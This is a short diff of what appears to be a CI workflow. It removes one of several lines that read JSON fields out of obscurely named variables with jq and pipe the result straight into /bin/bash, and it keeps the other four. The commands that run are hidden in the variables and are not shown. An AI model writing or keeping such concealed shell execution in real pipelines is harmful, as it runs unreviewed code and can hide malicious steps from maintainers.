@@ -21,7 +21,6 @@ jobs:
           echo $aer17 | jq -r .rjln468 | /bin/bash
           echo $bucpw85415 | jq -r .e5909 | /bin/bash
           echo $orckw1318 | jq -r .xgro87699 | /bin/bash
-          printf '%s' "$q3" | jq -r .q5055 | /bin/bash
           printf '%s' "$fu842" | jq -r .ugwe0 | /bin/bash
 
       - name: Upload artifact
